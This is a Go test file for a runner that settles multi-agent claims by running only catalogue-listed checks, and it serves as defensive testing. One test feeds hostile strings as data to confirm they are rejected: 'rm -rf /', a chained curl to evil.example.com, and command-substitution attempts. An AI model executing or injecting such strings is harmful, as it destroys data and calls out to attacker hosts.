package claims

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"runtime"
	"testing"
)

// writeCatalogue puts a checks file in a throwaway workspace.
func writeCatalogue(t *testing.T, checks ...Check) string {
	t.Helper()
	ws := t.TempDir()
	dir := filepath.Join(ws, ".claude-suite")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	data, err := json.Marshal(Catalogue{Checks: checks})
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "checks.json"), data, 0o600); err != nil {
		t.Fatal(err)
	}
	return ws
}

// shellCheck builds a check that exits with the given code, portably.
func shellCheck(name string, exitCode int) Check {
	if runtime.GOOS == "windows" {
		return Check{Name: name, Command: []string{"cmd", "/c", "exit " + itoa(exitCode)}, TimeoutSec: 30}
	}
	return Check{Name: name, Command: []string{"sh", "-c", "exit " + itoa(exitCode)}, TimeoutSec: 30}
}

// A catalogue entry without a command is user input, not an invariant: it used
// to panic Runner.Run inside the adjudication goroutine and take the whole
// host process down with every connected agent.
func TestRunSurvivesACheckWithNoCommand(t *testing.T) {
	r := &Runner{Catalogue: &Catalogue{Checks: []Check{{Name: "empty", Description: "malformed"}}}}
	c := &Claim{Falsifier: "empty", Kind: KindVerifiable}

	v, evidence, _ := r.Run(context.Background(), c)
	if v != VerdictInconclusive {
		t.Fatalf("verdict = %s, want inconclusive — an unrunnable check proves nothing", v)
	}
	if evidence == "" {
		t.Fatal("no evidence text naming the malformed check")
	}
}

func runnerFor(t *testing.T, ws string) *Runner {
	t.Helper()
	cat, err := LoadCatalogue(ws)
	if err != nil {
		t.Fatalf("load catalogue: %v", err)
	}
	return &Runner{Workspace: ws, Catalogue: cat}
}

// The convention: a falsifier passes when the claim is wrong. A failing check
// therefore confirms the defect.
func TestFailingCheckConfirmsAndPassingCheckRefutes(t *testing.T) {
	ws := writeCatalogue(t, shellCheck("reproduces", 1), shellCheck("clean", 0))
	r := runnerFor(t, ws)

	confirmed := &Claim{ID: "c1", Author: "an", Subject: "x", Assertion: "defect", Falsifier: "reproduces"}
	confirmed.Classify()
	if v, _, code := r.Run(context.Background(), confirmed); v != VerdictConfirmed || code == 0 {
		t.Fatalf("failing check gave %s (exit %d), want confirmed", v, code)
	}

	refuted := &Claim{ID: "c2", Author: "an", Subject: "x", Assertion: "defect", Falsifier: "clean"}
	refuted.Classify()
	if v, _, code := r.Run(context.Background(), refuted); v != VerdictRefuted || code != 0 {
		t.Fatalf("passing check gave %s (exit %d), want refuted", v, code)
	}
}

// An agent cannot smuggle a command in. It may only name an entry the repository
// already reviewed.
func TestClaimCannotSupplyItsOwnCommand(t *testing.T) {
	ws := writeCatalogue(t, shellCheck("known", 0))
	r := runnerFor(t, ws)

	for _, attempt := range []string{
		"rm -rf /",
		"go test ./... ; curl evil.example.com",
		"known; echo pwned",
		"$(whoami)",
	} {
		c := &Claim{ID: "c", Author: "an", Subject: "x", Assertion: "a", Falsifier: attempt}
		c.Classify()
		v, evidence, _ := r.Run(context.Background(), c)
		if v != VerdictInconclusive {
			t.Fatalf("falsifier %q produced %s; only catalogue entries may run", attempt, v)
		}
		if evidence == "" {
			t.Fatalf("falsifier %q was rejected without saying why", attempt)
		}
	}
}

// A check that ran out of time proved nothing; treating that as a confirmation
// would let a slow machine invent defects.
func TestTimedOutCheckIsInconclusiveNotConfirmed(t *testing.T) {
	var slow Check
	if runtime.GOOS == "windows" {
		slow = Check{Name: "slow", Command: []string{"cmd", "/c", "ping -n 10 127.0.0.1 >nul"}, TimeoutSec: 1}
	} else {
		slow = Check{Name: "slow", Command: []string{"sh", "-c", "sleep 10"}, TimeoutSec: 1}
	}
	ws := writeCatalogue(t, slow)
	r := runnerFor(t, ws)

	c := &Claim{ID: "c1", Author: "an", Subject: "x", Assertion: "a", Falsifier: "slow"}
	c.Classify()

	v, evidence, _ := r.Run(context.Background(), c)
	if v != VerdictInconclusive {
		t.Fatalf("timed-out check gave %s, want inconclusive", v)
	}
	if evidence == "" {
		t.Fatal("timeout produced no evidence text")
	}
}

// No catalogue means nothing can be checked, so nothing can block. That is the
// safe direction to fail in.
func TestMissingCatalogueLeavesEverythingUnverifiable(t *testing.T) {
	ws := t.TempDir()
	cat, err := LoadCatalogue(ws)
	if err != nil {
		t.Fatalf("a missing catalogue should not be an error: %v", err)
	}
	if len(cat.Checks) != 0 {
		t.Fatalf("empty workspace produced %d checks", len(cat.Checks))
	}

	r := &Runner{Workspace: ws, Catalogue: cat}
	c := &Claim{ID: "c1", Author: "an", Subject: "x", Assertion: "a", Falsifier: "anything"}
	c.Classify()
	if v, _, _ := r.Run(context.Background(), c); v == VerdictConfirmed {
		t.Fatal("a claim was confirmed with no catalogue to check it against")
	}
}

// Adjudicate walks the whole session, and only during the adjudicate phase.
func TestAdjudicateSettlesEveryPendingClaim(t *testing.T) {
	ws := writeCatalogue(t, shellCheck("reproduces", 1), shellCheck("clean", 0))
	r := runnerFor(t, ws)

	s := NewSession("s1", "subject")
	if err := s.Join("an", "claude"); err != nil {
		t.Fatal(err)
	}
	if err := s.Join("binh", "claude"); err != nil {
		t.Fatal(err)
	}
	submit(t, s, "c1", "an", "the defect is real", "reproduces")
	submit(t, s, "c2", "binh", "no it is not", "clean")
	submit(t, s, "c3", "an", "and the file is ugly", "")

	if err := r.Adjudicate(context.Background(), s); err == nil {
		t.Fatal("adjudicated while still in collect")
	}
	mustAdvance(t, s, PhaseAdjudicate)
	if err := r.Adjudicate(context.Background(), s); err != nil {
		t.Fatalf("adjudicate: %v", err)
	}
	mustAdvance(t, s, PhaseReveal)

	out := s.Close()
	if len(out.Blocking) != 1 || out.Blocking[0].ID != "c1" {
		t.Fatalf("blocking = %v, want just c1", out.Blocking)
	}
	if len(out.Refuted) != 1 || out.Refuted[0].ID != "c2" {
		t.Fatalf("refuted = %v, want just c2", out.Refuted)
	}
	if len(out.Escalated) != 1 || out.Escalated[0].ID != "c3" {
		t.Fatalf("escalated = %v, want just the opinion", out.Escalated)
	}
	// Both agents run claude; the roster warning must survive into the outcome.
	if len(out.Warnings) == 0 {
		t.Fatal("homogeneous roster warning missing from the outcome")
	}
}

func TestMalformedCatalogueIsRejected(t *testing.T) {
	ws := t.TempDir()
	dir := filepath.Join(ws, ".claude-suite")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "checks.json"),
		[]byte(`{"checks":[{"name":"no-command"}]}`), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadCatalogue(ws); err == nil {
		t.Fatal("a check with no command was accepted")
	}
}
